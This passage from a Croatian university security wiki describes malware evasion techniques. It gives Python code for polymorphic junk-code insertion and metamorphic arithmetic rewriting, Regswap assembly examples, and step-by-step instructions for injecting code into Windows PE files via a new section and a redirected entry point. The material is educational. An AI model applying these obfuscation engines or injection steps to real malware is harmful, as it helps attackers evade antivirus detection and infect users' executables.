<p>Sljedeći python kod je jednostavan proof of concept polimorfični engine, čiji je cilj obfuscirati enkripter nekog virusa:
</p>
<pre>
from random import randint

def junk_op(var1,var2,typ):
    p = randint(0,4)
    if typ==&quot;float&quot;:
        ops = [&quot;+&quot;,&quot;-&quot;,&quot;*&quot;,&quot;/&quot;]
    else:
        ops = [&quot;+&quot;,&quot;-&quot;,&quot;*&quot;,&quot;/&quot;,&quot;^&quot;,&quot;&amp;&quot;,&quot;|&quot;]
    comp = [&quot;&gt;&quot;,&quot;&lt;&quot;,&quot;==&quot;]
    if p==0: return var2 + &quot;=&quot; + var1 + ops[randint(0,len(ops)-1)] + str(randint(0,1000))
    elif p==1: return var2 + &quot;=&quot; + var1 + ops[randint(0,len(ops)-1)] + str(randint(0,1000)) + ops[randint(0,len(ops)-1)] + str(randint(0,1000))
    elif p==2: return &quot;if(&quot; + var1 + comp[randint(0,len(comp)-1)] + str(randint(-1000,1000)) + &quot;){ &quot; + var1 + ops[randint(0,len(ops)-1)] + &quot;=&quot; + str(randint(-1000,1000)) + &quot;; }&quot;
    elif p==3: return &quot;while(&quot; + var1 + &quot;&gt;&quot; + str(randint(-1000,1000)) + &quot;){ &quot; + var1 + &quot;-=&quot; + str(randint(1,500)) + &quot;; }&quot;
    elif p==4: return &quot;while(&quot; + var1 + &quot;&lt;&quot; + str(randint(-1000,1000)) + &quot;){ &quot; + var1 + &quot;+=&quot; + str(randint(1,500)) + &quot;; }&quot;

def junk(init):
    types = [&quot;int&quot;,&quot;long int&quot;,&quot;float&quot;,&quot;char&quot;,&quot;char*&quot;]
    name1 = &quot;&quot;.join([chr(65+randint(0,25)) for i in range(0,randint(3,6))]+[str(init%50)])
    name2 = &quot;&quot;.join([chr(65+randint(0,25)) for i in range(0,randint(3,6))]+[str(randint(10,20)+init%50)])
    tp = types[randint(0,len(types)-1)]
    to = randint(0,4)
    if tp!=&quot;char*&quot;:
        if tp==&quot;int&quot; or tp==&quot;long int&quot;:
            val1 = str(randint(0,1000))
        elif tp==&quot;float&quot;:
            val1 = str(randint(0,1000)) + &quot;.&quot; + str(randint(0,1000))
        elif tp==&quot;char&quot;:
            val1 = &quot;'&quot; + chr(65+randint(0,25)) + &quot;'&quot;
        junk = &quot;\n   &quot; + tp + &quot; &quot; + name1 + &quot;=&quot; + val1 + &quot;;&quot; + &quot;\n   &quot; + tp + &quot; &quot; + name2 + &quot;;\n   &quot; + junk_op(name1,name2,tp) + &quot;;&quot;
    elif tp==&quot;char*&quot;:
        val1 = &quot;\&quot;&quot; + &quot;&quot;.join([&quot;\\&quot;+hex(randint(1,255))[1:] for i in range(0,randint(5,20))]) + &quot;\&quot;&quot;
        junk = &quot;\n   &quot; + tp + &quot; &quot; + name1 + &quot;=&quot; + val1 + &quot;;&quot;
    return &quot;&quot;.join(junk)

def mutate(string):
    for i in range(len(string)-1,0,-1):
        if string[i]=='\n' and randint(0,1):
            j = junk(i)
            string = string[0:i] + j + string[i:len(string)]
    return string
</pre>
<p>U ovom primjeru, nasumično se dodaju operacije nad varijablama, selekcije i petlje. Ukoliko nepotreban kod ("junk") čini velik udio ukupnog koda, različite generacije koda će izgledati značajno različito.
</p><p>Primjerice, ukoliko se uzme skraćeni dio koda iz gornjeg primjera enkriptiranog virusa:
</p>
<pre>
char* cryptchar(char l, unsigned int key){
   char *fin;
   fin = (char*)malloc(5*sizeof(char));
   int c1=(int)((l^key) &amp; 0x00F0)/16;
   int c2=(int)((l^key) &amp; 0x000F);
   if(c1&lt;=9){
      fin[2]=(char)(48+c1);
   }else if(c1&lt;=15){
      fin[2]=(char)(65-10+c1);
   }
   return fin;
   }
</pre>
<p>Polimorfični obfuskator može kreirati ovakav kod, koji je zapravo istovjetan:
</p>
<pre>
char* cryptchar(char l, unsigned int key){
   char *fin;
   fin = (char*)malloc(5*sizeof(char));
   int c1=(int)((l^key) &amp; 0x00F0)/16;
   int c2=(int)((l^key) &amp; 0x000F);
   if(c1&lt;=9){
   int ZNLQYL33=440;
   int VFUAB45;
   VFUAB45=ZNLQYL33/405*395;
      fin[2]=(char)(48+c1);
   char OMP11='Y';
   char WHN29;
   if(OMP11&lt;722){ OMP11/=195; };
   }else if(c1&lt;=15){
      fin[2]=(char)(65-10+c1);
   }
   char IIHE18='B';
   char QVE37;
   while(IIHE18&gt;89){ IIHE18-=45; };
   return fin;
   }
</pre>
<p>Da se količina nepotrebnog koda ne bi akumulirala u svakoj sljedećoj generaciji virusa, postoji nekoliko opcija:
</p>
<ul><li> Virus sadrži čistu verziju originalnog koda u nekom kriptiranom stringu
</li><li> Virus sprema čistu verziju originalnog koda na neku specifičnu lokaciju koja je teško dostupna antivirusnom softveru, npr. file na disku kojeg po mogućnosti štiti neki rootkit ili virus-roditelj
</li><li> Virus koristi određene implicitne markere koji označavaju koji kod je nepotreban
</li><li> Virus nasljeđuje kompletan kod (uključujući "junk") od roditelja ali ga potom prvo sofisticiranim algoritmom pročišćava, a potom stvara novu mutaciju za svoje potomke
</li></ul>
<h4> <span class="mw-headline" id="Metamorfizam">Metamorfizam</span></h4>
Metamorfizam koda je svojstvo malwarea koje pokušava zaštiti kod doslovnom zamjenom koda. Za razliku od polimorfičnog malwarea, metamorfični program se ne mora enkriptirati, već se program mijenja nasumičnom zamjenom ekvivalentnih postupaka (funkcija). Primjerice, sljedeći blok c++ koda: <pre>int a = 5;
int b;
b = a * 3; // b iznosi 15</pre>
je semantički istovjetan sljedećem kodu, premda su sintaktički potpuno različiti:<pre>
float a = 2.0 * 2 + 1.0;
int b = 100;
b = a + a + a; // b iznosi 15
</pre>
<div class="thumb tright"><div class="thumbinner" style="width:424px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Metamorf.png" class="image"><img alt="" src="../../images/thumb/e/e6/Metamorf.png/422px-Metamorf.png" width="422" height="131" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Metamorf.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Prikaz metamorfičnog virusa kroz četiri generacije. Ako je dovoljno kompleksan virus, roditelj i dijete neće imati nikakvih zajedničkih dijelova. Ovdje više uopće nije potrebna enkripcija jer se kod mijenjanja iz generacije u generaciju kao da ga u svakoj iteraciji ponovno izrađuje drugi programer.</div></div></div>
<p>Nadalje, za razliku od polimorfičnog virusa koji u nekom trenutku mora biti dekriptiran, metamorfični virus ne zna kako je izgledao kod njegovog roditelja i koje je mutacije nasljedio. Metamorfični virus može mijenjati svoje instrukcije, vrijednosti operacija, redosljed izvođenja instrukcija (pomicati instrukcije i potom osigurati tok pomoću jumpova te razmješavati nezavisne dijelove koda) te mijenjati point of entry exe datoteke, tako da se teže prati tok. Zbog toga je čak i nakon ručne analize virusa problematično odrediti konkretnu karakterizaciju.
</p><p><br />
Slijede python snippeti koji mogu biti dio jednog metamorfičkog enginea:
</p><p>Rastavlja brojeve na nasumične aritmetičke operacije koje daju isti rezultat:
</p>
<pre>
import re
def rastavi(string):
    exp = re.compile('[0-9]{1,}[\.]?[0-9]*')
    rng = exp.search(string)
    ops = [&quot; + &quot;,&quot; - &quot;,&quot; ^ &quot;,&quot; * &quot;,&quot; / &quot;]  # operator ^ označava bitovni xor a ne potenciranje
    opinv = [&quot; - &quot;,&quot; + &quot;,&quot; ^ &quot;,&quot; / &quot;,&quot; * &quot;]  
    if rng:
        rng = rng.span()
        nr0 = string[rng[0]:rng[1]]
        nr1 = str(randint(2,100))
        r = randint(0,len(ops)-1)
        op = ops[r]
        if op==&quot; / &quot; and nr0==&quot;0&quot;: r = randint(0,len(ops)-2) # da se izbjegne dijeljenje s nulom
        if op==&quot; * &quot; and (int(nr1) &gt; int(nr0)): r = randint(0,len(ops)-3) # izbjegavati mnozenje ako je rezultat manji od operanda
        op = ops[r]      
        opi = opinv[r]
        nr2 = str(eval(nr0 + opi + nr1))
        if int(nr2)&lt;0: nr2 = &quot;(&quot; + nr2 + &quot;)&quot;
        newstr = &quot;(&quot; + nr2 + op + nr1 + &quot;)&quot;
        string = string[0:rng[0]] + newstr + rastavi(string[rng[1]:])
    return string
</pre>
<p>Sljedeća funkcija radi operaciju obrnuto od prijašnjeg koda (sastavlja jednostavne operacije na složene).
</p>
<pre>
import re
def sastavi(string):
    exp = re.compile('\([ \-\.\+\*\/0-9]*\)')
    rng = exp.search(string)
    if rng:
        rng = rng.span()
        calc = eval(string[rng[0]:rng[1]])
        evalstr = str(calc)
        string = sastavi(string[0:rng[0]] + evalstr + string[rng[1]:])
    return string
</pre>
<p>Kombinacijom gornjih dvaju funkcija može se nasumično dobiti zamjena operatora u nekom izrazu. Na sličan način se može konstruirati i kompliciranija zamjena operatora, npr.:
</p>
<ul><li> rastavljanje potenciranja na množenje
</li><li> rastavljanje množenja na zbrajanje
</li><li> pretvaranje bitovne xor operacije <i>p ^ q</i> u ekvivalentni izraz <i>((-p-1)|(-q-1))&amp;(p|q)</i>
</li><li> pretvaranje bitovne and operacije <i>p &amp; q</i> u <i>-((-p-1)|(-q-1))-1</i>
</li><li> pretvaranje bitovne or operacije <i>p | q</i> u <i>-((-p-1)&amp;(-q-1))-1</i>
</li><li> svođenje množenja sa potencijom broja 2 u lijevi bitshift, tj.: izraz <i>p * q</i> u izraz <i>p &lt;&lt; ld(q)</i>
</li><li> svođenje dijeljenja sa potencijom broja 2 u desni bitshift, tj.: izraz <i>p / q</i> u izraz <i>p &gt;&gt; ld(q)</i>
</li><li> na razini x86 koda, zamjena <i>and</i> instrukcije sa <i>test</i>
</li><li> na razini x86 koda, zamjena <i>add</i> instrukcije sa većim broje <i>inc</i> instrukcija
</li><li> na razini x86 koda, zamjena <i>sub</i> instrukcije sa većim brojem <i>dec</i> instrukcija
</li></ul>
<p>Jedan od prvih metamorfičnih virusa, Regswap  iz 1998. godine, koristio je jednostavan oblik metamorfizma na način da je virus u svakoj iteraciji mijenjao registre koje koristi. Isti segment assembly koda Regswap virusa izgleda drukčije u svakoj generaciji:
</p>
<pre>
5A                       pop   edx
BF04000000               mov   edi,0004h
8BF5                     mov   esi,ebp
B80C000000               mov   eax,000Ch
81C288000000             add   edx,0088h
8B1A                     mov   ebx,[edx]
899C8618110000           mov   [esi+eax*4+00001118],ebx
</pre>
<pre>
58                       pop   eax              &lt;-- registar edx (data register) zamijenjen sa eax (accumulation register)
BB04000000               mov   ebx,0004h        &lt;-- registar edi (destination index) zamijenjen sa ebx (base register)
8BD5                     mov   edx,ebp          &lt;-- registar esi (source index) zamijenjen sa edx
BF0C000000               mov   edi,000Ch        &lt;-- registar eax zamijenjen sa edi
81C088000000             add   eax,0088h       
8B30                     mov   esi,[eax]        &lt;-- registar ebx zamijenjen sa esi
89B4BA18110000           mov   [edx+edi*4+00001118],esi
</pre>
<p>Granica između metamorfičnog i polimorfičnog malwarea se gubi kada metamorfični engine počinje dodavati nepotrebne instrukcije u svoj kod (po uzoru na primjer od ranije). Ključna razlika u ovom slučaju je što metamorfični malware mutira cijeli svoj sadržaj, za razliku od polimorfičnog (koji mutira samo glavu programa te se u jednom trenutku mora cijeli dekriptirati). Poznati virus Zperm iz 2000. godine bio je potpuno otporan na jednostavno pretraživanje sadržaja koda jer na ovakav način mutirao svoj sadržaj: virus je pri izgradnji dijeteta dodavao nasumične jump instrukcije u kod, pazeći pritom da se održava semantika koda, te bi potom dodavao nepotrebne instrukcije između jumpova. Čak i bez dodavanja nepotrebnih instrukcija, bitnim instrukcijama se u svakoj iteraciji mijenja redosljed, zbog čega se Zperm nije mogao detektirati korištenjem potpisa, već se moralo oslanjati na heurističke pristupe.
</p><p>Najkompleksniji metamorfični virus bio je Zmist iz 2000. godine, ruskog autora Zombie. Zmist je metamorfični virus koji po potrebi nasumično koristi polimorfičnu enkripciju. Inficira windows PE binaryje, koje prvo dekompajlira, te potom nasumično ubacuje vlastite instrukcije između instrukcija host programa, pazeći pritom da ne poremeti tijek originalnog programa. Detekcija ovakvog virusa moguća je jedino ugradnjom kompleksnih algoritama u antivirusni program.
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Kivkovic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Kivkovic (stranica ne postoji)">Krešimir Ivković</a> 20:13, 5. siječnja 2012. (CET)
</p>
<h2> <span class="mw-headline" id="Code_injection">Code injection</span></h2>
<p>Code injection predstavlja iskorištavanje komponenti aplikacije na način koji nije predviđen. Time se želi u aplikaciju ubaciti kod kojeg će ta aplikacija izvršiti kao da je dio njezinog koda.
Od poznatijih code injection su:
</p>
<ul><li>PHP injection
</li><li>SQL injection
</li><li>Html/Script injection (XSS)
</li><li>Shell injection
</li><li>...
</li></ul>
<h3> <span class="mw-headline" id="Portable_Executable_Code_Injection">Portable Executable Code Injection</span></h3>
<p>Za razliku od code injection koji iskorištava polje za unos teksta kako bi ubacio kod, ovdje želimo ubaciti kod prije pokretanja aplikacije. 
<a href="http://en.wikipedia.org/wiki/Portable_Executable" class="external text" rel="nofollow">Portable executable</a>, u daljnjem tekstu PE, je tip datoteke za izvršne datoteke (.exe), dinamičke biblioteke(.dll) I slične tipove datoteka koji se koristi unutar Windows operacijskog sustava. One se mogu pokretati neovisno o arhitekturi na kojoj se nalazi OS.
</p>
<h4> <span class="mw-headline" id="Format_PE">Format PE</span></h4>
<div class="thumb tright"><div class="thumbinner" style="width:402px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:PE_Specification_graph.gif" class="image"><img alt="" src="../../images/thumb/5/59/PE_Specification_graph.gif/400px-PE_Specification_graph.gif" width="400" height="450" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:PE_Specification_graph.gif" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>PE Specifikacija <a href="http://flylib.com/books/en/4.460.1.17/1/" class="external autonumber" rel="nofollow">[8]</a></div></div></div>
<p>Ukratko PE datoteka se sastoji od:
</p>
<ul><li>PE zaglavlja – sadrži općenite informacije o aplikaciji, poput arhitekture na kojoj se može pokrenuti aplikacija, verzija kompajlera, veličina koda, itd
</li><li>Tablica sekcija – sadrži zaglavlja sekcija u kojima se nalaze osnovni podaci o sekcijama koje se nalaze u PE datoteci
</li><li>Sekcije – u njima se nalazi izvršni kod, prostor za spremanje varijabli, konstante, itd.
</li></ul>
<p>Iz PE zagljavlja potrebno je znati čemu služe sljedeći atributi:
</p>
<ul><li>NumberofSection – broj sekcija koje nalaze unutar datoteke
</li><li>AddressOfEntryPoint – adresa s obzirom na datoteku odakle će aplikacija početi izvršavati
</li></ul>
<p>Potom je potrebno znati ove atribute zaglavlje sekcije:
</p>
<ul><li>Name – proizvoljno ime sekcije. Iako se može uzeti proizvoljno ime sekcije postoje specijalni nazivi s kojima dolaze određene karakteristike. Tako npr. “.text” sadržava kod koji se izvršava, “.rdata” sadržava podatke koji se mogu samo čitati.
</li><li>VirtualSize – veličina sekcije nakon što se učita u rednu memoriju. Ona je veća od memorije koju zauzima sekcija unutar PE datoteke.  Slobodni dio sekcije se prepisuje nulama.*SizeOfRawData – veličina sekcije unutar PE datoteke. Količina memorije koje se uzima je višekratnik vrijednosti koje se nalazi pod FileAligment
</li><li>PointerToRawData – adresa unutar PE datoteke gdje se nalazi prvi bajt sekcije. Vrijednost adrese također mora biti višekratnik vrijednosti FileAligment
</li><li>Charateristics – Zastavice koje govore koje karakteristike ima sekcija. Postoje zastavice koje određuje zamo čitanje unutar prostora sekcije, samo pisanje, izvršavanje, zajednička memorija, itd. Te se zastavice također mogu kombinirati. 
</li></ul>
<p>Treba napomenuti da operacijski sustav PE datoteku koristi kao opisnik kako će aplikacija u radnoj memoriji izgledati. To osigurana jednu dozu sigurnosti prilikom izvršavanja same aplikacije.  Zbog toga aplikacija prilikom izvođena zauzima više memorije nego što je potrebno za samu PE datoteku te aplikacije.Kompletna specifikacija PE formata nalazi se <a href="http://msdn.microsoft.com/en-us/windows/hardware/gg463119.aspx" class="external text" rel="nofollow">ovdje</a>. 
Aplikacija s kojom se mogu pročitati zaglavlja neke aplikacije se nalazi <a href="http://cdn.bitbucket.org/pajdash/sis-code-injection/downloads/HeaderReaderv3.c" class="external text" rel="nofollow">ovdje</a>
</p>
<h4> <span class="mw-headline" id="Ubacivanje_koda">Ubacivanje koda</span></h4>
<p>Ima različitih načina za ubacivanje koda u PE datoteku. Jedan od jednostavnijih načina je u slučaju ako želimo ubaciti mali kod. Tada nam je ideja da svoj kod ubacimo pri kraju sekcije “.text” gdje se nalazi prazan prostor (nule). Potom je potrebno preusmjeriti  tok izvođenja aplikacije prema našem kodu. Nakon što se izvede naš kod, potrebno je ponovno vratiti tok izvođenja na orginalno mjesto. Problem je kod ovakvog načina ubacivanja koda  što većina antivirusnih programa prepozna ovakan način ubacivanja koda.
</p><p>Sljedeći način je da za kod koji želimo ubaciti kreiramo njegovu vlastitu sekciju. Na takav je način dodati bilo koji kod koji će se moći bez problem izvršavati. Za početak potrebno je promjeniti vrijednost atributa NumberofSection za jedan više što će govoriti operacijskom sustavu da PE datoteka ima sekciju više.  Potom je potrebno privremeno zapamtiti vrijednost atributa AddressOfEntryPoint kako bi znali preusmjeriti program nakon što se naš kod izvrši.  Za naš kod treba napraviti zaglavlje za sekciju koju ćemo smjestiti na kraj liste I samu sekciju koju ćemo staviti na kraj PE datoteke.  Ime sekcije može biti proizvoljno. SizeOfRawData I PointerToRawData moramo uskladiti sa našom sekcijom tako da bude prema specifikaciji . Characteristics mora imati vrijednost 0xE0000040 što označava da sekcija ima inicijalizirane podatke, sadržaj unutar sekcije se može izvršavati, čitati,te se u sekciju može zapisivati. Također treba paziti, ukoliko je došlo do pomaka prilikom ubacivanja zaglavlja, da li su u redu ostale sekcije I njihova zaglavlja. U tom slučaju potrebno je ažurirati adrese unutar zaglavlja sekcija.  Na kraju ubačenog  koda potrebno preusmjeriti tok izvođenja na mjesto koje je pokazivao atribut AddressOfEntryPoint, t e taj atribut ažurirati tako da se prvo izvršava ubačeni kod. 
</p>
<h4> <span class="mw-headline" id="Za.C5.A1tita">Zaštita</span></h4>
<p>Jednostavna zaštita protiv ubacivanja koda je sustav digitalnog potpisa.  Pri tome je potrebno prilikom svakog pokretanja aplikacije verificirati PE datoteku čime bi se spriječilo pokretanje aplikacije čiji je kod izmjenjen. 
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Juraj_Rasonja&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Juraj Rasonja (stranica ne postoji)">Juraj Rasonja</a> 01:49, 7. siječnja 2012. (CET)
</p>
<h2> <span class="mw-headline" id="Literatura"> Literatura </span></h2>
<p>Szor, Peter: The Art of Computer Virus Research and Defense, AWP 2005.
</p><p><a href="http://edwardsnyder.com/principles-of-computer-surveil" class="external free" rel="nofollow">http://edwardsnyder.com/principles-of-computer-surveil</a>
</p><p><a href="http://www.dtic.mil/cgi-bin/GetTRDoc?Location=U2&amp;doc=GetTRDoc.pdf&amp;AD=ADA519999" class="external free" rel="nofollow">http://www.dtic.mil/cgi-bin/GetTRDoc?Location=U2&amp;doc=GetTRDoc.pdf&amp;AD=ADA519999</a>
</p><p><a href="http://sce.uhcl.edu/yang/research/A%20Comparitive%20Analysis%20of%20Rootkit%20Detection%20Techniques.pdf" class="external free" rel="nofollow">http://sce.uhcl.edu/yang/research/A%20Comparitive%20Analysis%20of%20Rootkit%20Detection%20Techniques.pdf</a>
</p><p><a href="http://www.neowin.net/news/avast-windows-xp-makes-up-74-of-rootkit-infections" class="external free" rel="nofollow">http://www.neowin.net/news/avast-windows-xp-makes-up-74-of-rootkit-infections</a>
</p><p><a href="http://en.wikipedia.org/wiki/Ring_(computer_security)" class="external free" rel="nofollow">http://en.wikipedia.org/wiki/Ring_(computer_security)</a>
</p><p><a href="http://en.wikipedia.org/wiki/System_call" class="external free" rel="nofollow">http://en.wikipedia.org/wiki/System_call</a>
</p><p><a href="http://fluxius.handgrep.se/2011/01/02/ring-0f-fire-rootkits-and-dkom/" class="external free" rel="nofollow">http://fluxius.handgrep.se/2011/01/02/ring-0f-fire-rootkits-and-dkom/</a>
</p><p><a href="http://computer.forensikblog.de/en/2007/01/eprocess_6_0_6000_16386.html" class="external free" rel="nofollow">http://computer.forensikblog.de/en/2007/01/eprocess_6_0_6000_16386.html</a>
</p><p><a href="http://www.osronline.com/showThread.cfm?link=35916" class="external free" rel="nofollow">http://www.osronline.com/showThread.cfm?link=35916</a>
</p><p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681951(v=vs.85).aspx" class="external free" rel="nofollow">http://msdn.microsoft.com/en-us/library/windows/desktop/ms681951(v=vs.85).aspx</a>
</p><p><a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa363219(v=vs.85).aspx" class="external free" rel="nofollow">http://msdn.microsoft.com/en-us/library/windows/desktop/aa363219(v=vs.85).aspx</a>
</p><p><a href="http://en.wikipedia.org/wiki/Polymorphism_(computer_science)" class="external free" rel="nofollow">http://en.wikipedia.org/wiki/Polymorphism_(computer_science)</a>
</p><p><a href="http://en.wikipedia.org/wiki/Metamorphic_code" class="external free" rel="nofollow">http://en.wikipedia.org/wiki/Metamorphic_code</a>
</p><p><a href="http://www.ma.rhul.ac.uk/static/techrep/2008/RHUL-MA-2008-02.pdf" class="external free" rel="nofollow">http://www.ma.rhul.ac.uk/static/techrep/2008/RHUL-MA-2008-02.pdf</a>
</p><p><a href="http://www.symantec.com/avcenter/reference/striking.similarities.pdf" class="external free" rel="nofollow">http://www.symantec.com/avcenter/reference/striking.similarities.pdf</a>
</p><p><a href="http://www.codeproject.com/KB/winsdk/CodeInject.aspx" class="external free" rel="nofollow">http://www.codeproject.com/KB/winsdk/CodeInject.aspx</a>
</p><p><a href="http://flylib.com/books/en/4.460.1.17/1/" class="external free" rel="nofollow">http://flylib.com/books/en/4.460.1.17/1/</a>
</p><p><a href="http://www.ntcore.com/files/inject2exe.htm#TheSectionHeadersandSections2_3" class="external free" rel="nofollow">http://www.ntcore.com/files/inject2exe.htm#TheSectionHeadersandSections2_3</a>
</p><p><a href="http://msdn.microsoft.com/en-us/library/ms680198(v=VS.85).aspx" class="external free" rel="nofollow">http://msdn.microsoft.com/en-us/library/ms680198(v=VS.85).aspx</a>
</p>
<h2> <span class="mw-headline" id=".C4.8Clanovi_tima">Članovi tima</span></h2>
<p>Prijavljujem tim:--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Frane.jakelic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Frane.jakelic (stranica ne postoji)">Frane Jakelić</a> 21:11, 25. rujna 2011. (CEST); --<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Juraj_Rasonja&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Juraj Rasonja (stranica ne postoji)">Juraj Rasonja</a> 21:12, 25. rujna 2011. (CEST);--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Kivkovic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Kivkovic (stranica ne postoji)">Krešimir Ivković</a> 21:18, 25. rujna 2011. (CEST);--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Otepuric&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Otepuric (stranica ne postoji)">Ozren Tepuric</a> 21:20, 25. rujna 2011. (CEST)
</p>
<!-- 
NewPP limit report
Preprocessor node count: 327/1000000
Post-expand include size: 0/2097152 bytes
Template argument size: 0/2097152 bytes
Expensive parser function count: 0/100
-->

<!-- Saved in parser cache with key sisds:pcache:idhash:23-0!*!0!!hr!2!edit=0 and timestamp 20190203204041 -->
<div class="printfooter">
Dobavljeno iz "<a href="rootkita.html">http://security.foi.hr/wiki/index.php/Razvoj_naprednih_tehnika_za_izradu_malwarea/rootkita</a>"</div>
				<!-- /bodytext -->
								<!-- catlinks -->
				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
												<div class="visualClear"></div>
			</div>
			<!-- /bodyContent -->
		</div>
		<!-- /content -->
		<!-- header -->
		<div id="mw-head" class="noprint">
			
<!-- 0 -->
<div id="p-personal" class="">
	<h5>Osobni alati</h5>
	<ul>
					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Razvoj_naprednih_tehnika_za_izradu_malwarea/rootkita" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
			</ul>
</div>

<!-- /0 -->
			<div id="left-navigation">
				
<!-- 0 -->
<div id="p-namespaces" class="vectorTabs">
	<h5>Imenski prostori</h5>
	<ul>
					<li  id="ca-nstab-main" class="selected"><span><a href="rootkita.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
					<li  id="ca-talk"><span><a href="http://security.foi.hr/wiki/index.php/Razgovor:Razvoj_naprednih_tehnika_za_izradu_malwarea/rootkita"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
			</ul>
</div>

<!-- /0 -->

<!-- 1 -->
<div id="p-variants" class="vectorMenu emptyPortlet">
		<h5><span>Inačice</span><a href="rootkita.html#"></a></h5>
	<div class="menu">
		<ul>
					</ul>
	</div>
</div>

<!-- /1 -->
			</div>
			<div id="right-navigation">
				
<!-- 0 -->
<div id="p-views" class="vectorTabs">
	<h5>Pogledi</h5>
	<ul>
					<li id="ca-view" class="selected"><span><a href="rootkita.html" >Čitaj</a></span></li>
					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Razvoj_naprednih_tehnika_za_izradu_malwarea/rootkita&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Razvoj_naprednih_tehnika_za_izradu_malwarea/rootkita&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
			</ul>
</div>

<!-- /0 -->

<!-- 1 -->
<div id="p-cactions" class="vectorMenu emptyPortlet">
	<h5><span>Radnje</span><a href="rootkita.html#"></a></h5>
	<div class="menu">
		<ul>
					</ul>
	</div>
</div>

<!-- /1 -->

<!-- 2 -->
<div id="p-search">
	<h5><label for="searchInput">Traži</label></h5>
	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
		<input type='hidden' name="title" value="Posebno:Traži"/>
				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
			</form>
</div>

<!-- /2 -->
			</div>
		</div>
		<!-- /header -->
		<!-- panel -->
			<div id="mw-panel" class="noprint">
				<!-- logo -->
					<div id="p-logo"><a style="background-image: url(../../../images/osslogo.png);" href="../../../wiki.html"  title="Glavna stranica"></a></div>
				<!-- /logo -->
				
<!-- navigation -->
<div class="portal" id='p-navigation'>
	<h5>Orijentacija</h5>
	<div class="body">
				<ul>
					<li id="n-mainpage-description"><a href="../../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
					<li id="n-recentchanges"><a href="../Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
					<li id="n-randompage"><a href="../Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
					<li id="n-help"><a href="../Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
				</ul>
			</div>
</div>

<!-- /navigation -->

<!-- SEARCH -->

<!-- /SEARCH -->

<!-- TOOLBOX -->
<div class="portal" id="p-tb">
	<h5>Traka s alatima</h5>
	<div class="body">
		<ul>
					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Razvoj_naprednih_tehnika_za_izradu_malwarea/rootkita" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Razvoj_naprednih_tehnika_za_izradu_malwarea/rootkita" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
																																										<li id="t-specialpages"><a href="../Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Razvoj_naprednih_tehnika_za_izradu_malwarea/rootkita&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Razvoj_naprednih_tehnika_za_izradu_malwarea/rootkita&amp;oldid=5691" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
						</ul>
	</div>
</div>

<!-- /TOOLBOX -->

<!-- LANGUAGES -->

<!-- /LANGUAGES -->
			</div>
		<!-- /panel -->
		<!-- footer -->
		<div id="footer">
											<ul id="footer-info">
